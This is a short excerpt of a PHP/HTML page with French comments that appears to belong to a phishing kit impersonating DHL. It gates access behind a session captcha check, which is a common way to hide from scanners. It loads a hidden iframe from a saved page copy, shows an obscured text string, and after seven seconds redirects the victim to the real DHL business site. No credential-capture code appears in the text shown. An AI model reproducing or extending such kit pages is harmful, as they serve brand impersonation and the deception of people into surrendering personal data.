...
if (!isset($_SESSION['captcha']) || $_SESSION['captcha'] !== True) {
    header('Location: iio/'); // Redirige vers la page principale si le CAPTCHA n'est pas validé
    exit();
}
...
<body class=""><iframe aria-hidden="true" tabindex="-1" title="Text Zoom Event Iframe" style="width: 1em; height: 1px; border-width: 0px; position: absolute; overflow: hidden; white-space: nowrap; margin: -1px;" src="./styles/saved_resource.html"></iframe>
    ...
    <div class="l-view ">
       ...
       <div class="spn"><p><?php echo lang('xHp'); ?></p></div>
...
<script>
  // Attendez 7 secondes (7000 millisecondes) puis redirigez vers la nouvelle URL
  setTimeout(function() {
    window.location.href = "https://www.dhl.de/en/geschaeftskunden.html";
  }, 7000);
</script>
